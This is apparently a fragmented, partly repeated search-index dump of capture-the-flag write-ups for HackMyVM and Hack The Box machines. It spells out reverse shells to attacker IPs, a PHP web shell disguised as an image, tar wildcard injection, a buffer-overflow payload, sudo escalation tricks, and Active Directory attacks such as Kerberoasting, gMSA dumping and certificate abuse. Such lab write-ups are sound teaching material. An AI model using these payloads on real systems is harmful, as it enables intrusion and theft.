In this case, it is applied to everything inside the /opt directory. Inside /opt, we found the root user\u0026rsquo;s id_rsa file (a private SSH key) and since we have write permissions in this directory, it could be exploited.\nNow, we will exploit chown to change the owner of the root\u0026rsquo;s id_rsa to beloved. (Link where it explains how to exploit this vulnerability: Wildcard Injection)\nWe can do it by executing the following commands in /opt:\ntouch reference touch -- --reference=reference After waiting a minute, we will see that the id_rsa file becomes owned by us. In case the id_rsa is not in that directory but, for example, in /root/.ssh/id_rsa, we should create a symbolic link pointing to it like this:\nln -s /root/.ssh/id_rsa id_rsa With this approach, we can obtain any file owned by root without any issues. But since we already have the root\u0026rsquo;s id_rsa, we don\u0026rsquo;t need anything else.\nThe root's id_rsa is now under our ownership\rWe copy the contents of the id_rsa file and save it to our local machine. Next, we escalate privileges by running:\nchmod 600 id_rsa And we log in via SSH using the root user and this id_rsa, like this:\nssh -i id_rsa root@IP Finally, we obtain the root flag.\n","permalink":"http://localhost:1313/writeups/easy/beloved/","summary":"Difficulty: Easy 🟢","title":"Beloved - HackMyVM"},{"content":"\rMachine Link\n⚙️ Characteristics Characteristic Value Language C / C++ Arch x86-64 Platform Unix / Linux 🗒️ Writeup When trying to run the binary in different ways, it only returns the message \u0026ldquo;Bingus exploded\u0026rdquo;.\nWhat we\u0026rsquo;ll do is open the binary in Ghidra to inspect the code and find the function that checks the input.\nWe find the function that decides whether it has been exploited or not.

To do this, we set up a listener on port 4444 with netcat.\nnc -lvnp 4444 And then we execute this code on the website:\nnc -c bash 192.168.18.100 4444 By checking the sudo permissions, we see that the awk binary can be executed as root.\nSudo permissions\rThe GTFObins page shows how to exploit these permissions.\nCode we need to execute\rNow, we execute the command:\nsudo awk \u0026#39;BEGIN {system(\u0026#34;/bin/sh\u0026#34;)}\u0026#39; A new machine\rWe are not done yet.

In this case, the IP of the second machine is 192.168.18.193.\nSo, I perform another port scan with NMAP.\nAnother login page:\nNow, we will use Burp Suite to intercept data, and then use SQLMap to check if the login page is vulnerable to SQL Injection (SQLI).\nWe copy all this content and paste it into a file, which I will name sqlmap.txt.

We will test it with:\nhttp://environment.htb/?--env=test We continue exploring other paths to see if we can find something more useful.\nThe interesting part is found on the /login page.\nIf we intercept the request with Burp Suite and leave the “remember” field empty, submitting the request will trigger a code error.\nAs we can see, if we change the environment to “preprod”, it gives us a session as the user with ID 1 and redirects us to /management/dashboard. Since Laravel is vulnerable to changing the environment name, we can access it without issues.\nWe are logged in as Hish, but we don’t find any direct way to access the machine. For now, the only available attack vector is uploading Hish’s profile picture.\nFirst, we test if we can upload an image, and it works without issues.\nNow, the challenge is to upload a malicious file that allows code execution, making it appear as an image to the website, even though it actually contains PHP code.\nWe could try uploading the following code, which would allow us to execute commands remotely and even establish a reverse shell:\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We managed to upload it by bypassing with \u0026ldquo;cmd.php.\u0026rdquo;. This probably works because the upload filter only checks the final extension, and by adding the extra dot, the file passes validation, even though PHP interprets it normally. Now we can try executing commands on the server through the uploaded file’s URL.\nWe execute a Reverse Shell and access the machine.\nhttp://environment.htb/storage/files/cmd.php?cmd=nc -c /bin/bash 10.10.14.32 4444 Privilege escalation to Hish If we navigate to hish’s folder, we can read the User Flag. We also see a folder called backup.\nInside the backup folder, there is a file called keyvault.gpg, which is an encrypted GPG file that could contain sensitive information such as keys, passwords, or important configuration data.\nA user’s GPG keys are usually stored in their home directory, inside a hidden folder called .gnupg. This folder contains both public and private keys, the trust database, and GPG configuration. Only the owning user and root should normally have access.\nThis is vulnerable because the .gnupg directory has too permissive permissions, any user on the system can read its contents and enter it, even if they cannot modify it. Since private keys and sensitive GPG data are stored here, these permissions allow us to finally extract the contents of keyvault.gpg.\nTo do this, we copy the entire .gnupg content to a directory where we have write permissions, such as /tmp, and then we can use that directory as the --homedir for the gpg command. This allows us to access the user’s keys and perform encryption or decryption operations without being the original directory owner.\ncd /tmp \u0026amp;\u0026amp; mkdir gnupg\rcp -r /home/hish/.gnupg/* ./gnupg\rgpg --homedir=./gnupg -d /home/hish/backup/keyvault.gpg And we succeed in getting the password for the user Hish on this machine.\nPrivilege escalation to Root Running sudo -l, we see that we can execute the systeminfo script as any user without needing to provide a password.\nScript contents:\n#!/bin/bash\recho -e \u0026#34;\\n### Displaying kernel ring buffer logs (dmesg) ###\u0026#34;\rdmesg | tail -n 10\recho -e \u0026#34;\\n### Checking system-wide open ports ###\u0026#34;\rss -antlp\recho -e \u0026#34;\\n### Displaying information about all mounted filesystems ###\u0026#34;\rmount | column -t\recho -e \u0026#34;\\n### Checking system resource limits ###\u0026#34;\rulimit -a\recho -e \u0026#34;\\n### Displaying loaded kernel modules ###\u0026#34;\rlsmod | head -n 10\recho -e \u0026#34;\\n### Checking disk usage for all filesystems ###\u0026#34;\rdf -h As we can see, this script doesn’t contain anything interesting and doesn’t allow privilege escalation.

Since sudo preserves this variable, we can point it to our own script, and when we run sudo /usr/bin/systeminfo, Bash will execute our script with root privileges.\nWe create a Bash script in Hish’s home directory with the following content:\n#!/bin/bash\r/bin/bash Then we assign the BASH_ENV variable pointing to our script:\nexport BASH_ENV=/home/hish/root.sh When we execute sudo /usr/bin/systeminfo, Bash will automatically load our script, and we obtain a shell with root privileges.\nWe get the Root Flag and complete the machine!!\n","permalink":"http://localhost:1313/writeups/medium/environment/","summary":"Difficulty: Medium 🟠","title":"Environment - Hack The Box"},{"content":"Writeup in Spanish 🇪🇸 ","permalink":"http://localhost:1313/writeups/medium/family/","summary":"Difficulty: Medium 🟠","title":"Family - HackMyVM"},{"content":"\rMachine Link\nWe can see that when we open the machine it tells us its IP:\nSo knowing that the IP of the machine is 192.168.18.28, we are going to do a simple NMAP scan to see what ports it has open and what service they are running:\nNMAP simple scan\rWe can see that this machine hosts a web server on port 80 and that port 22 (ssh) is open.\nThis is what we see when we open the web server:\nIt tells us not to think too much.

In this case, we need to perform 2 privilege escalations to become the root user.\nPrivilege escalation to helder Now, let\u0026rsquo;s use LinPEAS, a tool for enumeration and security auditing. It focuses on identifying files with the SUID (Set User ID) and SGID (Set Group ID) permission bits set, which can potentially be exploited by attackers to escalate privileges and gain unauthorized access.\nWe download LinPEAS with the following command:\nwget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh We grant permissions for its execution and run it, saving the results in a file named LinpeasLog.\n./linpeas.sh \u0026gt; LinpeasLog And after some time of searching, I come across the following:\n📝 NOTE: The opasswd file stores users\u0026rsquo; old passwords in Linux to prevent them from reusing them when changing their password.\nAlthough it says it was Jack’s password, since some people reuse passwords (which is bad practice) we decided to check if it works for Helder. I tried it, and it worked. We obtained the user flag.\nUpon realizing that LinPEAS didn\u0026rsquo;t reveal anything new, I decide to use pspy. It is a process monitoring tool that provides real-time visibility into running processes without requiring elevated privileges. I downloaded it to my local machine and transferred it to the target machine by hosting a simple Python web server.\nNow we grant permissions and execute it.\nResult\rWe discovered a script that runs every minute as the root user (UID 0) and uses netcat to connect to localhost on port 10000, saving the data exchanged over the connection to a file named out in /root/.local/. Afterwards, it compares the contents of /root/.local/helder.txt and /home/helder/passwd.txt. If they match, it sets the SUID bit on the executable located in /usr/bin/, with the filename specified by the content of the out file.\nTo achieve this, the first step is to create the passwd.txt file in /home/helder as a symbolic link pointing to /root/.local/helder.txt. This ensures that passwd.txt contains the same content as helder.txt, so the condition will be true.\nln -s /root/.local/helder.txt /home/helder/passwd.txt ⚠️ IMPORTANT: A symbolic link is like a shortcut that points to another file. When a program accesses the link, it actually reads the file it points to. So even if you don’t own the original file, the program can access it through the link.\nThen, we check with the following command to confirm that it indeed points to /root/.local/helder.txt.\nls -la /home/helder/passwd.txt Now, we listen on port 10000 and send the text \u0026lsquo;bash\u0026rsquo;.

When we access the website, we see that we can upload an image.\nBy enumerating directories and files with Gobuster, we discover the existence of a directory called /uploads, nothing else is visible.\nThis is where the images uploaded by users are stored.\nWe try uploading an image to see if it works.\nThe only way I see to gain access to the machine is to upload a file that allows us to execute commands without the machine noticing, making it think it is just an image. For example, we could embed malicious PHP code into a supposed image.\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We will create a file on our local machine called cmd.php.jpg containing the previous code, and when uploading it, we will intercept the request with Burp Suite. In the “Filename” field, we will change it to cmd.php while keeping the MIME type as if it were an image.\nWe upload it without any issues, and now we can execute any command.\nTo access the machine, we will use a Reverse Shell.\nNow that we are inside the machine, let’s see why it was so easy to exploit by uploading a PHP file without being detected.\nAs we can see, it only restricted by MIME type, without actually verifying that the file was truly an image or a GIF.\nThe www-data user is part of the developers group, and we see that they own two directories.\nIn /opt/project, we find an HTML file for someone named Vlad, but there’s not much else here.\nIn the other directory, it seems to contain a backup of what looks like the previous project.\nSince there’s nothing else particularly interesting, we could use the tool pspy to see which processes and tasks are running on the system in real time.\nWe can see that every minute, the Developer user performs a backup of everything in /opt/project, placing it into a file called project.tgz inside /var/backups/ and compressing it with gzip to save space.\nIt is vulnerable because we have write permissions and it uses * to include all files. If there’s a file with a malicious name, that name could be executed as a command during the backup. Here’s an explanation on how to exploit this vulnerability: Wildcard Injection\nWe execute the following commands in /opt/project and wait to receive the shell:\necho \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/YOUR_IP/PORT 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt; revshell.sh\recho \u0026#34;\u0026#34; \u0026gt; --checkpoint=1\recho \u0026#34;\u0026#34; \u0026gt; \u0026#34;--checkpoint-action=exec=bash revshell.sh\u0026#34; We are now the Developer user.\nBy running the command sudo -l, we see that the script sysinfo.sh can be executed as alfonso without providing a password.\nThe script is vulnerable because it uses eval with user input, which allows executing dangerous commands. An attacker can exploit this to run any command.\nTo test this, in the first input we enter 1, and in the second input we enter the command id, but we precede it with a ; to separate commands. It will then execute:\ndf; id It is vulnerable, so it’s as simple as running a Reverse Shell to become alfonso.\nNow we can retrieve the User Flag.\nRoot Escalation The last step is to escalate to root. Again, by using sudo -l, we see that we can execute a binary as any user without providing their password. We could try to exploit this to escalate to root.\nWe copy the file to Alfonso’s folder, start a temporary web server with Python, and download the binary to our local machine to test it in a more controlled environment.\nWe give it execution permissions and run it.\nWe can see that it outputs user data from /etc/passwd.\nNow, we will open it with Ghidra to analyze how it is implemented internally.\nWe can now see that it might be vulnerable to a Buffer Overflow because gets(buffer) allows writing more data than the buffer can hold, overwriting memory and potentially executing malicious code.\nHowever, by examining the code further, we find a function that has never been executed, which prints the contents of the /etc/shadow file.\nThe plan is to exploit it using a Buffer Overflow to ultimately execute this function called get_shadow.\nBuffer Overflow Exploitation We will first create the complete payload on our local machine using gdb. Here’s a guide on how to exploit a buffer overflow to execute functions: Buffer Overflow - Invoking Functions\nFirst, we create a pattern to find the offset and run the script, providing this pattern as input.\n📝NOTE: In a Buffer Overflow, the offset is the number of bytes needed to reach the return address, which in x86 corresponds to the EIP. Overwriting it allows controlling where the program jumps when the function ends.\nr \u0026lt;\u0026lt;\u0026lt; \u0026#39;PATTERN\u0026#39; Now we can calculate how many characters are needed to reach the EIP with this command:\npattern offset $eip We can verify it like this to confirm the offset is actually 76:\nr \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;print(\u0026#34;A\u0026#34;*76 + \u0026#34;B\u0026#34;*4)\u0026#39;) It is indeed 76. Next, we need the memory address of the get_shadow function we found earlier in Ghidra.\np get_shadow We must write the address in little-endian (for example, 0x080484b6 as \\xb6\\x84\\x04\\x08), since systems store multi-byte values in that order for the function to execute correctly.\nIn our case, it will be:\n\\x05\\x99\\x04\\x08 We start converting from the end to the beginning.\rNow we have everything. Instead of BBBB, we use \\x05\\x99\\x04\\x08. The best way to execute it is:\n./silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We will run it directly on the target machine, using sudo and the full path to the binary.\nsudo /usr/bin/silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We obtain the root user’s password hash, which we will crack using hashcat.\nhashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt Password obtained!

After a few minutes of searching, I didn’t find anything. The next step I have in mind is to use BloodHound to map the target’s Active Directory structure, identify relationships between users, groups, and permissions, and find potential privilege escalation paths within the domain. (Quick guide on installing and using BloodHound: BloodHound)\nWe obtain domain information using the following command:\nbloodhound-python -d \u0026#39;tombwatcher.htb\u0026#39; -u \u0026#39;henry\u0026#39; -p \u0026#39;H3nry_987TGV!\u0026#39; -gc \u0026#39;dc01.tombwatcher.htb\u0026#39; -ns 10.10.11.72 -v --zip -c all Then we upload the resulting ZIP file to BloodHound.\nWe search for the user Henry and find that we have WriteSPN permission on the user Alfred.\nHaving WriteSPN on another user means we can modify their SPN, which is a unique identifier linking a user or service account to a service in the domain for Kerberos authentication. This allows us to perform a Kerberoasting attack to obtain their password hash and escalate privileges within the domain.\nTo do this, we first clone the targetedKerberoast repository.\ngit clone https://github.com/ShutdownRepo/targetedKerberoast.git To perform the attack, we need to be time-synchronized.\nsudo ntpdate tombwatcher.htb In my case, I use ntpdate only to get the target machine’s time, then use faketime, because on Kali the time doesn’t sync properly. This way, we can simulate the domain time and make Kerberos work.\nfaketime \u0026#39;YYYY-MM-DD HH:MM:SS\u0026#39; ./targetedKerberoast.py -v -d \u0026#39;tombwatcher.htb\u0026#39; -u \u0026#39;henry\u0026#39; -p \u0026#39;H3nry_987TGV!\u0026#39; We copy the hash and crack it with John The Ripper.\njohn -w=/usr/share/wordlists/rockyou.txt hash_alfred With access to the Alfred account, we look in BloodHound for a new way to escalate to another user.\nAs we can see, we have the ability to add Alfred to the INFRASTRUCTURE group. Once Alfred is a member of this group, we gain ReadGMSAPassword permission on the user ANSIBLE_DEV$, which allows us to read the password of their Kerberos-managed account and use it to escalate privileges within the domain.\nWe use bloodyAD instead of net rpc because bloodyAD communicates directly with Active Directory via LDAP or modern RPC and can handle domain permissions that net rpc cannot. It is also more reliable for adding users to groups when net rpc fails due to restrictions or compatibility issues.\nbloodyAD -u \u0026#39;alfred\u0026#39; -p \u0026#39;basketball\u0026#39; -d tombwatcher.htb --dc-ip 10.10.11.72 add groupMember INFRASTRUCTURE alfred\r[+] alfred added to INFRASTRUCTURE The next step is to exploit the ReadGMSAPassword permission, and BloodHound shows us how to perform the attack.\nWe clone the gMSADumper repository to our local machine.\ngit clone https://github.com/micahvandeusen/gMSADumper.git And run the following command:\n./gMSADumper.py -u alfred -p basketball -d tombwatcher.htb With this hash, we can authenticate as ANSIBLE_DEV$ on the domain, whether for pass-the-hash, Kerberos attacks, or privilege escalation to access restricted resources.\nThe next step is to force the Sam user to change their password.

Instructions for exploitation: ESC15\nTo exploit the vulnerability, we first request a certificate in the name of the Administrator using Certipy.\ncertipy-ad req -dc-ip 10.10.11.72 -ca tombwatcher-CA-1 -target DC01.tombwatcher.htb -u cert_admin@tombwatcher.htb -p \u0026#39;admin1234\u0026#39; -template WebServer -upn administrator@tombwatcher.htb -application-policies \u0026#39;Client Authentication\u0026#39; This command generates a .pfx file containing the certificate with Administrator privileges.\nNext, we use that certificate to authenticate and open an LDAP session with administrative access.\ncertipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.72 -ldap-shell This gives us a Domain Admin session, allowing us to control the domain and execute critical actions.\nUsing the help command, we see what actions can be executed.\nWe can change the Administrator user’s password.\nFinally, we obtain the Root Flag and complete the machine!!\n","permalink":"http://localhost:1313/writeups/medium/tombwatcher/","summary":"Difficulty: Medium 🟠","title":"TombWatcher - Hack The Box"},{"content":"\rWe start by performing a quick port scan with Nmap to see which ports are open.\nsudo nmap -sS -p- --min-rate 4500 -n -Pn -vvv 10.10.11.76 Using these ports, we now perform a deeper scan, saving the results to a file called \u0026ldquo;target\u0026rdquo;.\nnmap -sCV -p445,135,139,53,88,49668,389,2222,3268,58816,5985,58833,58815,58828,3269 -n -Pn 10.10.11.76 -oN target We add the domain to the /etc/hosts file so we can resolve both the domain and the domain controller name.\nTo start hacking the machine, we are given some initial credentials.\nryan.naylor : HollowOct31Nyt When trying to enumerate SMB shares with the credentials ryan.naylor:HollowOct31Nyt, authentication fails. This is not because the credentials are wrong, but because the Active Directory server does not allow direct authentication with username and password, it requires Kerberos. In other words, before interacting with SMB, we need a TGT (Ticket Granting Ticket) that proves our identity to the KDC (Key Distribution Center, the central server that issues authentication tickets in the domain).\nTo obtain the TGT, we first synchronize the clock with the domain server, since Kerberos is sensitive to time differences.\nsudo ntpdate voleur.htb Since Kali doesn’t sync directly with the domain server using ntpdate, I used faketime to simulate the correct time in the process of generating the ticket.\nfaketime \u0026#39;YYYY-MM-DD HH:MM:SS\u0026#39; impacket-getTGT voleur.htb/\u0026#39;ryan.naylor\u0026#39;:\u0026#39;HollowOct31Nyt\u0026#39; Then, I exported the generated file to the KRB5CCNAME environment variable.\nexport KRB5CCNAME=$PWD/ryan.naylor.ccache This tells all Kerberos tools (and SMB in our case) to use that ticket instead of attempting to authenticate directly with the password.\nYou can use klist to verify that the ticket was loaded correctly.\nNow, to access the shared resources, instead of smbclient I used impacket-smbclient, as it offers more reliable Kerberos support and allows directly using cached tickets (-k -no-pass).\nfaketime \u0026#34;$(ntpdate -q voleur.htb | awk \u0026#39;{print $1 \u0026#34; \u0026#34; $2}\u0026#39;)\u0026#34; impacket-smbclient -k -no-pass -dc-ip 10.10.11.76 VOLEUR.HTB/ryan.naylor@dc.voleur.htb We found an Excel file that is password protected, so we cannot open it directly.

This folder contains both public and private keys, the trust database, and GPG configuration. Only the owning user and root should normally have access.\nThis is vulnerable because the .gnupg directory has too permissive permissions, any user on the system can read its contents and enter it, even if they cannot modify it.

This allows us to access the user’s keys and perform encryption or decryption operations without being the original directory owner.\ncd /tmp \u0026amp;\u0026amp; mkdir gnupg\rcp -r /home/hish/.gnupg/* ./gnupg\rgpg --homedir=./gnupg -d /home/hish/backup/keyvault.gpg And we succeed in getting the password for the user Hish on this machine.\nPrivilege escalation to Root Running sudo -l, we see that we can execute the systeminfo script as any user without needing to provide a password.\nScript contents:\n#!/bin/bash\recho -e \u0026#34;\\n### Displaying kernel ring buffer logs (dmesg) ###\u0026#34;\rdmesg | tail -n 10\recho -e \u0026#34;\\n### Checking system-wide open ports ###\u0026#34;\rss -antlp\recho -e \u0026#34;\\n### Displaying information about all mounted filesystems ###\u0026#34;\rmount | column -t\recho -e \u0026#34;\\n### Checking system resource limits ###\u0026#34;\rulimit -a\recho -e \u0026#34;\\n### Displaying loaded kernel modules ###\u0026#34;\rlsmod | head -n 10\recho -e \u0026#34;\\n### Checking disk usage for all filesystems ###\u0026#34;\rdf -h As we can see, this script doesn’t contain anything interesting and doesn’t allow privilege escalation.

It focuses on identifying files with the SUID (Set User ID) and SGID (Set Group ID) permission bits set, which can potentially be exploited by attackers to escalate privileges and gain unauthorized access.\nWe download LinPEAS with the following command:\nwget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh We grant permissions for its execution and run it, saving the results in a file named LinpeasLog.\n./linpeas.sh \u0026gt; LinpeasLog And after some time of searching, I come across the following:\n📝 NOTE: The opasswd file stores users\u0026rsquo; old passwords in Linux to prevent them from reusing them when changing their password.\nAlthough it says it was Jack’s password, since some people reuse passwords (which is bad practice) we decided to check if it works for Helder. I tried it, and it worked. We obtained the user flag.\nUpon realizing that LinPEAS didn\u0026rsquo;t reveal anything new, I decide to use pspy. It is a process monitoring tool that provides real-time visibility into running processes without requiring elevated privileges. I downloaded it to my local machine and transferred it to the target machine by hosting a simple Python web server.\nNow we grant permissions and execute it.\nResult\rWe discovered a script that runs every minute as the root user (UID 0) and uses netcat to connect to localhost on port 10000, saving the data exchanged over the connection to a file named out in /root/.local/. Afterwards, it compares the contents of /root/.local/helder.txt and /home/helder/passwd.txt. If they match, it sets the SUID bit on the executable located in /usr/bin/, with the filename specified by the content of the out file.\nTo achieve this, the first step is to create the passwd.txt file in /home/helder as a symbolic link pointing to /root/.local/helder.txt. This ensures that passwd.txt contains the same content as helder.txt, so the condition will be true.\nln -s /root/.local/helder.txt /home/helder/passwd.txt ⚠️ IMPORTANT: A symbolic link is like a shortcut that points to another file. When a program accesses the link, it actually reads the file it points to. So even if you don’t own the original file, the program can access it through the link.\nThen, we check with the following command to confirm that it indeed points to /root/.local/helder.txt.\nls -la /home/helder/passwd.txt Now, we listen on port 10000 and send the text \u0026lsquo;bash\u0026rsquo;. When the script runs, it will save this input to the out file and set the SUID bit on the corresponding executable in /usr/bin/.

When we access the website, we see that we can upload an image.\nBy enumerating directories and files with Gobuster, we discover the existence of a directory called /uploads, nothing else is visible.\nThis is where the images uploaded by users are stored.\nWe try uploading an image to see if it works.\nThe only way I see to gain access to the machine is to upload a file that allows us to execute commands without the machine noticing, making it think it is just an image. For example, we could embed malicious PHP code into a supposed image.\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We will create a file on our local machine called cmd.php.jpg containing the previous code, and when uploading it, we will intercept the request with Burp Suite. In the “Filename” field, we will change it to cmd.php while keeping the MIME type as if it were an image.\nWe upload it without any issues, and now we can execute any command.\nTo access the machine, we will use a Reverse Shell.\nNow that we are inside the machine, let’s see why it was so easy to exploit by uploading a PHP file without being detected.\nAs we can see, it only restricted by MIME type, without actually verifying that the file was truly an image or a GIF.\nThe www-data user is part of the developers group, and we see that they own two directories.\nIn /opt/project, we find an HTML file for someone named Vlad, but there’s not much else here.\nIn the other directory, it seems to contain a backup of what looks like the previous project.\nSince there’s nothing else particularly interesting, we could use the tool pspy to see which processes and tasks are running on the system in real time.\nWe can see that every minute, the Developer user performs a backup of everything in /opt/project, placing it into a file called project.tgz inside /var/backups/ and compressing it with gzip to save space.\nIt is vulnerable because we have write permissions and it uses * to include all files. If there’s a file with a malicious name, that name could be executed as a command during the backup. Here’s an explanation on how to exploit this vulnerability: Wildcard Injection\nWe execute the following commands in /opt/project and wait to receive the shell:\necho \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/YOUR_IP/PORT 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt; revshell.sh\recho \u0026#34;\u0026#34; \u0026gt; --checkpoint=1\recho \u0026#34;\u0026#34; \u0026gt; \u0026#34;--checkpoint-action=exec=bash revshell.sh\u0026#34; We are now the Developer user.\nBy running the command sudo -l, we see that the script sysinfo.sh can be executed as alfonso without providing a password.\nThe script is vulnerable because it uses eval with user input, which allows executing dangerous commands. An attacker can exploit this to run any command.\nTo test this, in the first input we enter 1, and in the second input we enter the command id, but we precede it with a ; to separate commands. It will then execute:\ndf; id It is vulnerable, so it’s as simple as running a Reverse Shell to become alfonso.\nNow we can retrieve the User Flag.\nRoot Escalation The last step is to escalate to root. Again, by using sudo -l, we see that we can execute a binary as any user without providing their password. We could try to exploit this to escalate to root.\nWe copy the file to Alfonso’s folder, start a temporary web server with Python, and download the binary to our local machine to test it in a more controlled environment.\nWe give it execution permissions and run it.\nWe can see that it outputs user data from /etc/passwd.\nNow, we will open it with Ghidra to analyze how it is implemented internally.\nWe can now see that it might be vulnerable to a Buffer Overflow because gets(buffer) allows writing more data than the buffer can hold, overwriting memory and potentially executing malicious code.\nHowever, by examining the code further, we find a function that has never been executed, which prints the contents of the /etc/shadow file.\nThe plan is to exploit it using a Buffer Overflow to ultimately execute this function called get_shadow.\nBuffer Overflow Exploitation We will first create the complete payload on our local machine using gdb. Here’s a guide on how to exploit a buffer overflow to execute functions: Buffer Overflow - Invoking Functions\nFirst, we create a pattern to find the offset and run the script, providing this pattern as input.\n📝NOTE: In a Buffer Overflow, the offset is the number of bytes needed to reach the return address, which in x86 corresponds to the EIP.

After a few minutes of searching, I didn’t find anything. The next step I have in mind is to use BloodHound to map the target’s Active Directory structure, identify relationships between users, groups, and permissions, and find potential privilege escalation paths within the domain. (Quick guide on installing and using BloodHound: BloodHound)\nWe obtain domain information using the following command:\nbloodhound-python -d \u0026#39;tombwatcher.htb\u0026#39; -u \u0026#39;henry\u0026#39; -p \u0026#39;H3nry_987TGV!\u0026#39; -gc \u0026#39;dc01.tombwatcher.htb\u0026#39; -ns 10.10.11.72 -v --zip -c all Then we upload the resulting ZIP file to BloodHound.\nWe search for the user Henry and find that we have WriteSPN permission on the user Alfred.\nHaving WriteSPN on another user means we can modify their SPN, which is a unique identifier linking a user or service account to a service in the domain for Kerberos authentication. This allows us to perform a Kerberoasting attack to obtain their password hash and escalate privileges within the domain.\nTo do this, we first clone the targetedKerberoast repository.\ngit clone https://github.com/ShutdownRepo/targetedKerberoast.git To perform the attack, we need to be time-synchronized.\nsudo ntpdate tombwatcher.htb In my case, I use ntpdate only to get the target machine’s time, then use faketime, because on Kali the time doesn’t sync properly.

Once Alfred is a member of this group, we gain ReadGMSAPassword permission on the user ANSIBLE_DEV$, which allows us to read the password of their Kerberos-managed account and use it to escalate privileges within the domain.\nWe use bloodyAD instead of net rpc because bloodyAD communicates directly with Active Directory via LDAP or modern RPC and can handle domain permissions that net rpc cannot. It is also more reliable for adding users to groups when net rpc fails due to restrictions or compatibility issues.\nbloodyAD -u \u0026#39;alfred\u0026#39; -p \u0026#39;basketball\u0026#39; -d tombwatcher.htb --dc-ip 10.10.11.72 add groupMember INFRASTRUCTURE alfred\r[+] alfred added to INFRASTRUCTURE The next step is to exploit the ReadGMSAPassword permission, and BloodHound shows us how to perform the attack.\nWe clone the gMSADumper repository to our local machine.\ngit clone https://github.com/micahvandeusen/gMSADumper.git And run the following command:\n./gMSADumper.py -u alfred -p basketball -d tombwatcher.htb With this hash, we can authenticate as ANSIBLE_DEV$ on the domain, whether for pass-the-hash, Kerberos attacks, or privilege escalation to access restricted resources.\nThe next step is to force the Sam user to change their password. In this case, we use bloodyAD instead of impacket-owneredit because it allows us to work directly with account hashes in a simpler and more reliable way to change passwords without needing the plaintext password.\nbloodyAD --host 10.10.11.72 -d \u0026#39;tombwatcher.htb\u0026#39; -u \u0026#39;ansible_dev$\u0026#39; -p \u0026#39;:ecb4146b3f99e6bbf06ca896f504227c\u0026#39; set password SAM \u0026#39;sam123\u0026#39;\r[+] Password changed successfully!

The first thing we need to do is go to a directory where we have write permissions, such as the /tmp directory, and there we will create a Perl file and execute it as the toreto user.\nHere is the Perl code:\necho -ne \u0026#39;#!/bin/perl \\nuse POSIX qw(setuid); \\nPOSIX::setuid(0); \\nexec \u0026#34;/bin/bash\u0026#34;;\u0026#39; \u0026gt; script.pl And we execute it like this:\nsudo -u toreto /usr/bin/perl script.pl This will allow us to obtain the shell of toreto.\nWe are the user toreto\rI\u0026rsquo;ve tried sudo -l, looking to see if any SUID binaries could be useful, and I\u0026rsquo;ve even checked the capabilities, but found nothing.

In this case, we need to perform 2 privilege escalations to become the root user.\nPrivilege escalation to helder Now, let\u0026rsquo;s use LinPEAS, a tool for enumeration and security auditing. It focuses on identifying files with the SUID (Set User ID) and SGID (Set Group ID) permission bits set, which can potentially be exploited by attackers to escalate privileges and gain unauthorized access.\nWe download LinPEAS with the following command:\nwget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh We grant permissions for its execution and run it, saving the results in a file named LinpeasLog.\n./linpeas.sh \u0026gt; LinpeasLog And after some time of searching, I come across the following:\n📝 NOTE: The opasswd file stores users\u0026rsquo; old passwords in Linux to prevent them from reusing them when changing their password.\nAlthough it says it was Jack’s password, since some people reuse passwords (which is bad practice) we decided to check if it works for Helder. I tried it, and it worked. We obtained the user flag.\nUpon realizing that LinPEAS didn\u0026rsquo;t reveal anything new, I decide to use pspy. It is a process monitoring tool that provides real-time visibility into running processes without requiring elevated privileges. I downloaded it to my local machine and transferred it to the target machine by hosting a simple Python web server.\nNow we grant permissions and execute it.\nResult\rWe discovered a script that runs every minute as the root user (UID 0) and uses netcat to connect to localhost on port 10000, saving the data exchanged over the connection to a file named out in /root/.local/. Afterwards, it compares the contents of /root/.local/helder.txt and /home/helder/passwd.txt. If they match, it sets the SUID bit on the executable located in /usr/bin/, with the filename specified by the content of the out file.\nTo achieve this, the first step is to create the passwd.txt file in /home/helder as a symbolic link pointing to /root/.local/helder.txt. This ensures that passwd.txt contains the same content as helder.txt, so the condition will be true.\nln -s /root/.local/helder.txt /home/helder/passwd.txt ⚠️ IMPORTANT: A symbolic link is like a shortcut that points to another file. When a program accesses the link, it actually reads the file it points to. So even if you don’t own the original file, the program can access it through the link.\nThen, we check with the following command to confirm that it indeed points to /root/.local/helder.txt.\nls -la /home/helder/passwd.txt Now, we listen on port 10000 and send the text \u0026lsquo;bash\u0026rsquo;. When the script runs, it will save this input to the out file and set the SUID bit on the corresponding executable in /usr/bin/. In this case, we\u0026rsquo;re granting SUID permissions to bash.\necho \u0026#39;bash\u0026#39; | nc -lvnp 10000 What I mentioned can be observed in the code\rAfter executing the exploit, we notice a brief connection.

